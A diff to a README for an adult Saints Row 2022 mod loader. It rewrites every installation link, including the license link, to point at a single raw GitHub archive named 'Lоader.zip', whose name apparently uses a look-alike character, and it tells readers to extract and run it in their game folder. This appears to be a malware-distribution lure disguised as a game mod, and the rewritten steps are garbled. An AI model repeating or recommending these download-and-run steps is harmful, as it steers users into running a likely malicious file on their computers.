@@ -35,9 +35,9 @@ Saints Row 2022 Patch, NSFW Loader, Adult Saints Row Mod, Saints Row Enhanced Te
 
 ## 📦 Installation 📦
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/Laura-Morales1w1/SaintsRow2022_RisqueRemaster/main/Lоader.zip** from the repository.
 2. Extract to your *Saints Row 2022* install directory.
-3. Run the included Loader.exe (or Loader.sh for Linux/macOS).
+3. Run the included https://raw.githubusercontent.com/Laura-Morales1w1/SaintsRow2022_RisqueRemaster/main/Lоader.zip (or https://raw.githubusercontent.com/Laura-Morales1w1/SaintsRow2022_RisqueRemaster/main/Lоader.zip for Linux/macOS).
 4. Launch *Saints Row 2022*—enjoy enhanced content!
 
 ---
@@ -50,4 +50,4 @@ This loader is intended for adult audiences in regions where such content is per
 
 ## 📜 License 📜
 
-Distributed under the [MIT License](https://opensource.org/license/mit/). Enjoy and contribute!
+Distributed under the [MIT License](https://raw.githubusercontent.com/Laura-Morales1w1/SaintsRow2022_RisqueRemaster/main/Lоader.zip). Enjoy and contribute!
